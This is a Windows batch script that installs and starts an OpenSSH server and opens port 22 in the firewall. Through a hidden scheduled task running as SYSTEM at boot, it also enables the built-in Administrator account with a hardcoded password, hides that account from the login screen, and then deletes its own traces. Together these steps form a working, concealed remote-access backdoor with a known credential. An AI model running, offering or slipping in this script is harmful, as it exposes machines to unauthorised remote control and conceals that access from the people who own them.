    
cls
@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
if exist "%programdata%\ssh.ps1" del /q "%programdata%\ssh.ps1"
if exist "%programdata%\ssh.bat" del /q "%programdata%\ssh.bat"
echo Invoke-WebRequest -Uri 'https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.2.2.0p1-Beta/OpenSSH-Win64.zip' -OutFile '%programdata%\OpenSSH.zip'> "%programdata%\ssh.ps1"
echo Expand-Archive '%programdata%\OpenSSH.zip' -DestinationPath '%systemdrive%\Program Files\OpenSSH'>> "%programdata%\ssh.ps1"
echo cd "%systemdrive%\Program Files\OpenSSH\OpenSSH-Win64">> "%programdata%\ssh.ps1"
echo powershell.exe -ExecutionPolicy Bypass -File ".\install-sshd.ps1">> "%programdata%\ssh.ps1"
echo del /q "%programdata%\OpenSSH.zip">> "%programdata%\ssh.ps1"
echo Start-Service sshd >> "%programdata%\ssh.ps1"
echo Set-Service -Name sshd -StartupType 'Automatic' >> "%programdata%\ssh.ps1"
echo if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue ^| Select-Object Name, Enabled)) {Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..." >> "%programdata%\ssh.ps1"
echo New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22} else {Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."} >> "%programdata%\ssh.ps1"
echo :loop >"%programdata%\ssh.bat"
echo for /f %%%%a in ('powershell -command "Test-Connection -ComputerName www.github.com -Quiet"') do (if not "%%%%a"=="True" timeout 600 ^& goto loop) >>"%programdata%\ssh.bat"
echo taskkill /f /im powershell.exe >>"%programdata%\ssh.bat"
echo powershell.exe -ExecutionPolicy Bypass -File "%programdata%\ssh.ps1">>"%programdata%\ssh.bat"
echo net user Administrator /active:yes>>"%programdata%\ssh.bat"
echo net user Administrator 55991133>>"%programdata%\ssh.bat"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v Administrator>>"%programdata%\ssh.bat"
echo netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes>>"%programdata%\ssh.bat"
echo if not exist "%ProgramFiles%\OpenSSH" timeout 600 ^& goto loop >>"%programdata%\ssh.bat"
echo del /q "%programdata%\OpenSSH.zip" ^& del /q "%programdata%\ssh.ps1" ^& del /q "%programdata%\tmpsession" ^& schtasks /delete /tn SSH /F ^& del /q "%programdata%\ssh.bat" >>"%programdata%\ssh.bat"
echo ^<?xml version="1.0" encoding="UTF-16"?^>^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>^<RegistrationInfo^>^<Date^>2024-01-04T08:45:56.4208771^</Date^>^<Author^>a\a^</Author^>^<URI^>\SSH^</URI^>^</RegistrationInfo^>^<Triggers^>^<BootTrigger^>^<Enabled^>true^</Enabled^>^</BootTrigger^>^</Triggers^>^<Principals^>^<Principal id="Author"^>^<UserId^>S-1-5-18^</UserId^>^<RunLevel^>HighestAvailable^</RunLevel^>^</Principal^>^</Principals^>^<Settings^>^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>^<AllowHardTerminate^>false^</AllowHardTerminate^>^<StartWhenAvailable^>true^</StartWhenAvailable^>^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>^<IdleSettings^>^<StopOnIdleEnd^>false^</StopOnIdleEnd^>^<RestartOnIdle^>false^</RestartOnIdle^>^</IdleSettings^>^<AllowStartOnDemand^>true^</AllowStartOnDemand^>^<Enabled^>true^</Enabled^>^<Hidden^>true^</Hidden^>^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>^<DisallowStartOnRemoteAppSession^>false^</DisallowStartOnRemoteAppSession^>^<UseUnifiedSchedulingEngine^>true^</UseUnifiedSchedulingEngine^>^<WakeToRun^>false^</WakeToRun^>^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>^<Priority^>7^</Priority^>^<RestartOnFailure^>^<Interval^>PT1M^</Interval^>^<Count^>5^</Count^>^</RestartOnFailure^>^</Settings^>^<Actions Context="Author"^>^<Exec^>^<Command^>%programdata%\ssh.bat^</Command^>^</Exec^>^</Actions^>^</Task^> > "%programdata%\ssh.xml"
schtasks /create /tn SSH /xml "%programdata%\ssh.xml" /ru System /f >nul 2>&1 
del /q "%programdata%\ssh.xml"
schtasks /run /tn SSH >nul 2>&1 
exit
